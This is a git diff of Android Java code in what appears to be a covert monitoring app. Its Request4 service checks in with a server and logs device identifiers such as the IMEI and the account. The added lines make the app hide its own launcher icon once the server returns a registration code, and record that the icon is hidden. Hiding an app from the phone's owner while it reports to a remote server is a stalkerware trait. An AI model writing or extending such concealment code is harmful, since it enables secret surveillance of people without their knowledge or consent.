@@ -5,6 +5,7 @@ import java.util.Calendar;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import com.inet.android.utils.HiddingIcon;
 import com.inet.android.utils.Logging;
 
 import android.app.AlarmManager;
@@ -12,6 +13,7 @@ import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.content.SharedPreferences.Editor;
 import android.os.IBinder;
 import android.preference.PreferenceManager;
 
@@ -47,6 +49,7 @@ public class Request4 extends Service {
 				Logging.doLog(LOG_TAG, "code : 0", "code : 0");
 
 				if (sp.getString("error", "-1").equals("0")) {
+					
 					sendStartRequest();
 				}
 				if (sp.getString("error", "-1").equals("1")) {
@@ -62,6 +65,14 @@ public class Request4 extends Service {
 			}
 
 			if (code.equals("1") || code.equals("2")) {
+				if (!sp.getBoolean("hideIcon", false)) {
+					Logging.doLog(LOG_TAG, "hide icon");
+					HiddingIcon hi = new HiddingIcon(this);
+					hi.hideIcon();
+					Editor ed = sp.edit();
+					ed.putBoolean("hideIcon", true);
+					ed.commit();
+				}
 				sendPeriodicRequest(); // выполнение периодического запроса
 			}
 
@@ -93,7 +104,8 @@ public class Request4 extends Service {
 			Logging.doLog(LOG_TAG, "send start request", "send start request");
 		
 			SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(this);
-			Logging.doLog(LOG_TAG, "send start request, imei: ", sp.getString("imei", "imei"));
+			
+			Logging.doLog(LOG_TAG, "send start request, accoutnt: " + sp.getString("account", "account"));
 
 			JSONObject jsonObject = new JSONObject();
 			try {
